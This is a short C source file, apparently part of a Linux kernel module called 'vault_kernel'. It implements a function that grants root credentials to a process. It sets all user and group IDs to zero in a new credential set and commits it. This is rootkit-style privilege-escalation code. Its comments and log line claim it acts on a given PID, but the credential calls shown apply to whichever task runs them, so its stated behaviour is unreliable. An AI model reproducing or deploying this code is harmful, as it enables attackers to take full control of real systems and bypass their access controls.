/* vault_kernel - priv_esc.c
 * Privilege escalation: give any process root credentials
 * ruby570bocadito © 2026
 */
#include "core.h"

int priv_esc_give_root(pid_t pid) {
    struct task_struct *task;
    struct cred *new_creds;
    struct pid *pid_struct;

    pid_struct = find_get_pid(pid);
    if (!pid_struct) {
        pr_warn(VAULT_KERNEL_TAG " give_root: PID %d not found\n", pid);
        return -ESRCH;
    }

    task = pid_task(pid_struct, PIDTYPE_PID);
    put_pid(pid_struct);

    if (!task) {
        pr_warn(VAULT_KERNEL_TAG " give_root: task for PID %d not found\n", pid);
        return -ESRCH;
    }

    new_creds = prepare_creds();
    if (!new_creds)
        return -ENOMEM;

    /* Set all UIDs to root */
    new_creds->uid.val = new_creds->euid.val = 0;
    new_creds->suid.val = new_creds->fsuid.val = 0;

    /* Set all GIDs to root */
    new_creds->gid.val = new_creds->egid.val = 0;
    new_creds->sgid.val = new_creds->fsgid.val = 0;

    commit_creds(new_creds);

    pr_info(VAULT_KERNEL_TAG " gave root to PID %d (%s)\n",
            pid, task->comm);
    return 0;
}
